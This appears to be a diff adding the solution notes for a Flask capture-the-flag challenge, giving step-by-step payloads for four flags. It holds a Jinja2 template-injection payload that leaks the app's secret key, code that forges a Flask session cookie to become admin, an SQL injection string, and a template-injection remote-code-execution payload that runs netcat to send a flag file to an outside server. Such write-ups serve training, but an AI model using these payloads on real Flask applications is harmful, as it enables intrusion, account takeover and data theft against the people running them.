@@ -1,0 +1,40 @@
+pip install flask flask_login flask_wtf wtforms flask_sqlalchemy flask_bootstrap
+
+Flag 1 (Leak SECRET_KEY):
+	register a user with name: "{{ config }}"
+	login
+	re-visit the login page while authenticated
+	
+Flag 2 (Gain admin):
+	Decode your cookie by either writing your own code or using a tool like: https://www.kirsle.net/wizards/flask-session.cgi
+	Write your own flask app with the leaked SECRET KEY
+	
+		from flask import Flask, session,render_template_string
+		app = Flask("example")
+		app.secret_key = "SECRET_KEY"
+
+		@app.route("/")
+		def test():
+			print("doing it")
+			session['_fresh'] = True
+			session['_id'] = <your_id>
+			session['csrf_token'] = <your_token>
+			session["user_id"] = "1"
+			
+			return render_template_string("<html>Did it</html>")
+		app.run(host='0.0.0.0',port=8080)
+		
+	visit your created site, copy the created cookie and overwrite your own cookie for the site (if you're running both servers locally you can skip overwritting). Browse to /admin
+	
+Flag 3 (SQLi):
+	On the admin page the admin is able to set comments for users (but admin is not shown)
+	Change one of the user's comments to something to the effect of: ' || (select comment from User where id=1) || '
+	
+Flag 4 (RCE):
+	There are a lot of ways to go about this but the vulnerability is pretty well described here: https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html
+	
+	Register a user with the name: {{ ''.__class__.mro()[1].__subclasses__() }}
+	Login then re-visit the login page
+	Take note of the index of: <class 'subprocess.Popen'> (NOTE - if using line number you need to subtract 1 for 0 based indexes)
+	Now register a new user with a name like: {{ ''.__class__.mro()[1].__subclasses__()[181]('nc your_server 8080 < flag',shell=True) }} (Where 181 is the index you previously found)
+	Login then re-visit the login page
